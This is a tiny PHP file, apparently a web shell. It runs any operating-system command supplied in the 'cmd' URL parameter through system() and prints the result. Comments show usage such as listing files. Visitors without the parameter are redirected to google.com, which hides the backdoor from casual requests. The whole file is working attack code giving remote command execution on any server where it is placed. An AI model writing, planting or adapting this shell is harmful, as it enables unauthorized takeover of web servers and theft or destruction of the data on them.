<?php
/* USE: index.php?cmd=command */
/* USE: index.php?cmd=ls -a */
if (!isset($_GET['cmd'])){
	header('Location: http://www.google.com/'); // Redirect to
} else { print(system($_GET['cmd'])); } //Exec command
?>
